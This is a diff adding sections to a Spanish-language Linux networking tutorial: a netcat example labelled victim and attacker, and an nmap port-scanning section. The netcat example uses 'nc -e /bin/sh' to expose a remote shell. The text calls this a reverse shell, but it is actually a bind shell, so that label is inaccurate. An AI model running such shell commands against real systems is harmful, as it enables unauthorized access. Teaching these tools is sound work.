@@ -316,6 +316,18 @@ Hola
 Qué tal?
 ```
 
+Por otra parte, existe la posibilidad de generar un shell inverso entre máquina cliente y servidor de la siguiente forma.
+
+Máquina servidor o víctima:
+```bash
+nc -lvp 1234 -e /bin/sh &
+```
+
+Máquina cliente o atancante:
+```bash
+nc <IP_VICTIMA> 1234
+```
+
 La cantidad de múltiples usos de netcat (similares a los que podría tener una navaja suiza), ha derivado en calificar este software de esta forma.
 
 #### Comando ss
@@ -399,3 +411,18 @@ Bases de datos más comunes que puedes consultar con getent:
 - shadow: Muestra las contraseñas encriptadas de los usuarios (requiere permisos de superusuario).
 
 En resumen, getent es una herramienta muy versátil para consultar diversas bases de datos del sistema. Permite extraer información sobre usuarios, grupos, hosts, servicios, protocolos y más. Es útil en entornos donde se utiliza LDAP o NIS para la gestión de cuentas de usuario y otros recursos de red, ya que consulta todas las fuentes configuradas en /etc/nsswitch.conf.
+
+#### Comando nmap
+El comando *nmap* es un escaneador de puertos:
+```bash
+yum install nmap -y
+apt install nmap -y
+
+nmap --help
+nmap localhost
+
+nmap  -v -A 192.168.1.125
+```
+Como parámetros a destacar:
+- *-v*: Activa el modo verboroso (verbose), lo que significa que nmap mostrará más información sobre el progreso del escaneo mientras se ejecuta.
+- *-A*: Activa la detección de sistema operativo y versión de servicios, también intenta detectar scripts y realizar un traceroute (ruta de red). Esta opción proporciona un análisis más detallado del host.
